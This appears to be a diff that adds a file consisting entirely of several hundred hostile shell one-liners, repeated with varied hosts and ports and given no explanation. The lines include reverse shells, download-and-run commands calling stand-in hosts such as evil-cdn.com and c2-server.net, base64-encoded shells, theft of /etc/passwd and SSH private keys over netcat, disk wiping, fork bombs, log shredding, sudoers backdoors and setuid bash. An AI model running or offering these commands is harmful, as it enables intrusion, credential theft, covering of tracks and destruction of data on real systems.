@@ -1,0 +1,2307 @@
+bash -i >& /dev/tcp/172.16.4.2/4444 0>&1
+nc -e /bin/sh 192.168.1.24 8888
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+dd if=/dev/zero of=/dev/sda
+nc -e /bin/sh 8.8.4.4 8888
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 1337
+shred -n 33 -uz /var/log/auth.log
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+cat /etc/passwd | nc 8.8.4.4 4444
+cat /etc/shadow
+cat /etc/passwd | nc 127.0.0.1 4444
+curl http://103.22.12.5/auth_server.sh | bash
+:(){ :|:& };:
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+sudo chmod 4755 /bin/bash
+curl http://evil-cdn.com/webapp.sh | bash
+curl http://malware-repo.io/config_prod.sh | bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+bash -i >& /dev/tcp/127.0.0.1/9001 0>&1
+cat /etc/shadow
+cat /etc/shadow
+cat /etc/shadow
+bash -i >& /dev/tcp/8.8.4.4/8888 0>&1
+cat /etc/passwd | nc 127.0.0.1 443
+curl http://103.22.12.5/main_script.sh | bash
+:(){ :|:& };:
+:(){ :|:& };:
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 443
+:(){ :|:& };:
+:(){ :|:& };:
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/shadow
+sudo chmod 4755 /bin/bash
+cat /etc/shadow
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 9001
+nc -e /bin/sh 192.168.1.24 8888
+dd if=/dev/zero of=/dev/sda
+bash -i >& /dev/tcp/10.10.1.5/4444 0>&1
+curl http://evil-cdn.com/main_script.sh | bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+curl http://malware-repo.io/auth_server.sh | bash
+bash -i >& /dev/tcp/127.0.0.1/443 0>&1
+cat /etc/passwd | nc 127.0.0.1 8888
+nc -e /bin/sh 10.10.1.5 4444
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+curl http://103.22.12.5/auth_server.sh | bash
+:(){ :|:& };:
+nc -e /bin/sh 172.16.4.2 1337
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+bash -i >& /dev/tcp/10.10.1.5/1337 0>&1
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+curl http://103.22.12.5/test_suite.sh | bash
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+shred -n 33 -uz /var/log/auth.log
+rm -rf / --no-preserve-root
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 443
+bash -i >& /dev/tcp/127.0.0.1/8888 0>&1
+cat /etc/shadow
+bash -i >& /dev/tcp/172.16.4.2/4444 0>&1
+curl http://malware-repo.io/data_dump.sh | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 8888
+:(){ :|:& };:
+curl http://evil-cdn.com/test_suite.sh | bash
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+bash -i >& /dev/tcp/172.16.4.2/4444 0>&1
+nc -e /bin/sh 127.0.0.1 4444
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+cat /etc/passwd | nc 127.0.0.1 443
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+rm -rf / --no-preserve-root
+rm -rf / --no-preserve-root
+nc -e /bin/sh 192.168.1.24 443
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 127.0.0.1 443
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+bash -i >& /dev/tcp/172.16.4.2/9001 0>&1
+cat /etc/shadow
+nc -e /bin/sh 8.8.4.4 9001
+dd if=/dev/zero of=/dev/sda
+nc -e /bin/sh 172.16.4.2 443
+nc -e /bin/sh 10.10.1.5 443
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 9001
+curl http://c2-server.net/config_prod.sh | bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+:(){ :|:& };:
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+curl http://evil-cdn.com/test_suite.sh | bash
+:(){ :|:& };:
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+:(){ :|:& };:
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+shred -n 33 -uz /var/log/auth.log
+cat /etc/passwd | nc 172.16.4.2 443
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+shred -n 33 -uz /var/log/auth.log
+rm -rf / --no-preserve-root
+shred -n 33 -uz /var/log/auth.log
+cat /etc/passwd | nc 192.168.1.24 4444
+curl http://evil-cdn.com/webapp.sh | bash
+rm -rf / --no-preserve-root
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.24",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 4444
+:(){ :|:& };:
+cat /etc/passwd | nc 192.168.1.24 4444
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 9001
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+rm -rf / --no-preserve-root
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 8888
+nc -e /bin/sh 172.16.4.2 1337
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+:(){ :|:& };:
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 9001
+nc -e /bin/sh 8.8.4.4 4444
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+rm -rf / --no-preserve-root
+cat /etc/passwd | nc 10.10.1.5 4444
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+dd if=/dev/zero of=/dev/sda
+curl http://malware-repo.io/auth_server.sh | bash
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/passwd | nc 127.0.0.1 443
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/shadow
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+bash -i >& /dev/tcp/10.10.1.5/1337 0>&1
+cat /etc/shadow
+dd if=/dev/zero of=/dev/sda
+cat /etc/passwd | nc 10.10.1.5 8888
+curl http://c2-server.net/webapp.sh | bash
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 9001
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+dd if=/dev/zero of=/dev/sda
+rm -rf / --no-preserve-root
+nc -e /bin/sh 10.10.1.5 443
+cat /etc/passwd | nc 192.168.1.24 1337
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/shadow
+cat /etc/shadow
+:(){ :|:& };:
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+sudo chmod 4755 /bin/bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 9001
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+:(){ :|:& };:
+nc -e /bin/sh 10.10.1.5 4444
+sudo chmod 4755 /bin/bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+rm -rf / --no-preserve-root
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 4444
+cat /etc/shadow
+bash -i >& /dev/tcp/10.10.1.5/8888 0>&1
+bash -i >& /dev/tcp/192.168.1.24/443 0>&1
+dd if=/dev/zero of=/dev/sda
+rm -rf / --no-preserve-root
+shred -n 33 -uz /var/log/auth.log
+cat /etc/passwd | nc 8.8.4.4 4444
+curl http://evil-cdn.com/config_prod.sh | bash
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+:(){ :|:& };:
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+bash -i >& /dev/tcp/8.8.4.4/9001 0>&1
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 443
+curl http://malware-repo.io/webapp.sh | bash
+cat /etc/passwd | nc 127.0.0.1 9001
+nc -e /bin/sh 10.10.1.5 8888
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 9001
+nc -e /bin/sh 10.10.1.5 8888
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+sudo chmod 4755 /bin/bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 4444
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 1337
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+sudo chmod 4755 /bin/bash
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 1337
+:(){ :|:& };:
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+rm -rf / --no-preserve-root
+dd if=/dev/zero of=/dev/sda
+nc -e /bin/sh 192.168.1.24 8888
+sudo chmod 4755 /bin/bash
+rm -rf / --no-preserve-root
+nc -e /bin/sh 10.10.1.5 9001
+:(){ :|:& };:
+curl http://evil-cdn.com/webapp.sh | bash
+cat /etc/passwd | nc 127.0.0.1 9001
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+sudo chmod 4755 /bin/bash
+bash -i >& /dev/tcp/10.10.1.5/9001 0>&1
+sudo chmod 4755 /bin/bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 4444
+rm -rf / --no-preserve-root
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+rm -rf / --no-preserve-root
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+nc -e /bin/sh 8.8.4.4 4444
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/shadow
+dd if=/dev/zero of=/dev/sda
+curl http://103.22.12.5/backup_daily.sh | bash
+nc -e /bin/sh 8.8.4.4 4444
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 443
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+curl http://malware-repo.io/auth_server.sh | bash
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+rm -rf / --no-preserve-root
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+cat /etc/shadow
+rm -rf / --no-preserve-root
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+dd if=/dev/zero of=/dev/sda
+cat /etc/passwd | nc 10.10.1.5 1337
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 1337
+curl http://malware-repo.io/main_script.sh | bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+curl http://evil-cdn.com/auth_server.sh | bash
+cat /etc/passwd | nc 127.0.0.1 8888
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+:(){ :|:& };:
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+cat /etc/passwd | nc 192.168.1.24 1337
+echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/shadow
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 4444
+dd if=/dev/zero of=/dev/sda
+:(){ :|:& };:
+cat /etc/passwd | nc 10.10.1.5 1337
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+sudo chmod 4755 /bin/bash
+curl http://103.22.12.5/config_prod.sh | bash
+sudo chmod 4755 /bin/bash
+cat /etc/shadow
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+rm -rf / --no-preserve-root
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+:(){ :|:& };:
+curl http://103.22.12.5/config_prod.sh | bash
+bash -i >& /dev/tcp/8.8.4.4/1337 0>&1
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+nc -e /bin/sh 10.10.1.5 1337
+cat /etc/shadow
+cat /etc/shadow
+sudo chmod 4755 /bin/bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/passwd | nc 192.168.1.24 9001
+bash -i >& /dev/tcp/172.16.4.2/443 0>&1
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+cat /etc/shadow
+cat /etc/passwd | nc 127.0.0.1 4444
+rm -rf / --no-preserve-root
+rm -rf / --no-preserve-root
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/passwd | nc 8.8.4.4 1337
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+shred -n 33 -uz /var/log/auth.log
+curl http://malware-repo.io/auth_server.sh | bash
+cat /etc/shadow
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+bash -i >& /dev/tcp/172.16.4.2/9001 0>&1
+rm -rf / --no-preserve-root
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.4.2",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+echo 'dev_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+cat /etc/passwd | nc 10.10.1.5 9001
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+curl http://evil-cdn.com/auth_server.sh | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 1337
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 8.8.4.4 8888
+:(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+cat /etc/shadow
+cat /etc/passwd | nc 8.8.4.4 1337
+dd if=/dev/zero of=/dev/sda
+curl http://103.22.12.5/backup_daily.sh | bash
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 192.168.1.24 9001
+nc -e /bin/sh 10.10.1.5 9001
+dd if=/dev/zero of=/dev/sda
+cat /etc/passwd | nc 10.10.1.5 8888
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/passwd | nc 172.16.4.2 1337
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+nc -e /bin/sh 127.0.0.1 4444
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 8888
+curl http://malware-repo.io/main_script.sh | bash
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+bash -i >& /dev/tcp/10.10.1.5/1337 0>&1
+:(){ :|:& };:
+bash -i >& /dev/tcp/192.168.1.24/4444 0>&1
+shred -n 33 -uz /var/log/auth.log
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+sudo chmod 4755 /bin/bash
+dd if=/dev/zero of=/dev/sda
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+dd if=/dev/zero of=/dev/sda
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.1.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+shred -n 33 -uz /var/log/auth.log
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+shred -n 33 -uz /var/log/auth.log
+:(){ :|:& };:
+sudo chmod 4755 /bin/bash
+sudo chmod 4755 /bin/bash
+echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+cat /etc/passwd | nc 10.10.1.5 4444
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+wget http://c2-server.net/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+nc -e /bin/sh 172.16.4.2 9001
+nc -e /bin/sh 172.16.4.2 8888
+shred -n 33 -uz /var/log/auth.log
+dd if=/dev/zero of=/dev/sda
+shred -n 33 -uz /var/log/auth.log
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+wget http://malware-repo.io/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+:(){ :|:& };:
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+sudo chmod 4755 /bin/bash
+:(){ :|:& };:
+wget http://103.22.12.5/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+rm -rf / --no-preserve-root
+nc -e /bin/sh 8.8.4.4 1337
+rm -rf / --no-preserve-root
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+dd if=/dev/zero of=/dev/sda
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("8.8.4.4",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+cat /etc/passwd | nc 8.8.4.4 443
+nc -e /bin/sh 127.0.0.1 1337
+cat /etc/passwd | nc 127.0.0.1 8888
+shred -n 33 -uz /var/log/auth.log
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+rm -rf / --no-preserve-root
+curl http://malware-repo.io/backup_daily.sh | bash
+cat /etc/passwd | nc 127.0.0.1 9001
+bash -i >& /dev/tcp/10.10.1.5/443 0>&1
+dd if=/dev/zero of=/dev/sda
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 172.16.4.2 4444
+bash -i >& /dev/tcp/172.16.4.2/4444 0>&1
+nc -e /bin/sh 172.16.4.2 4444
+sudo chmod 4755 /bin/bash
+bash -i >& /dev/tcp/172.16.4.2/443 0>&1
+nc -e /bin/sh 8.8.4.4 8888
+shred -n 33 -uz /var/log/auth.log
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+sudo chmod 4755 /bin/bash
+echo bmMgLWUgL2Jpbi9zaCAxMjcuMC4wLjEgMTMzNw== | base64 -d | bash
+rm -rf / --no-preserve-root
+bash -i >& /dev/tcp/172.16.4.2/9001 0>&1
+cat /etc/shadow
+rm -rf / --no-preserve-root
+dd if=/dev/zero of=/dev/sda
+nc -e /bin/sh 10.10.1.5 1337
+:(){ :|:& };:
+echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+cat /etc/passwd | nc 10.10.1.5 443
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 10.10.1.5 8888
+cat /etc/passwd | nc 8.8.4.4 443
+:(){ :|:& };:
+wget http://evil-cdn.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x
+shred -n 33 -uz /var/log/auth.log
+rm -rf / --no-preserve-root
+:(){ :|:& };:
+bash -i >& /dev/tcp/172.16.4.2/8888 0>&1
+bash -i >& /dev/tcp/8.8.4.4/443 0>&1
+find / -name 'id_rsa' 2>/dev/null | xargs cat | nc 127.0.0.1 1337
+dd if=/dev/zero of=/dev/sda
+sudo chmod 4755 /bin/bash
+sudo chmod 4755 /bin/bash
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+shred -n 33 -uz /var/log/auth.log
+sudo chmod 4755 /bin/bash
+echo 'sysop ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+nc -e /bin/sh 8.8.4.4 1337
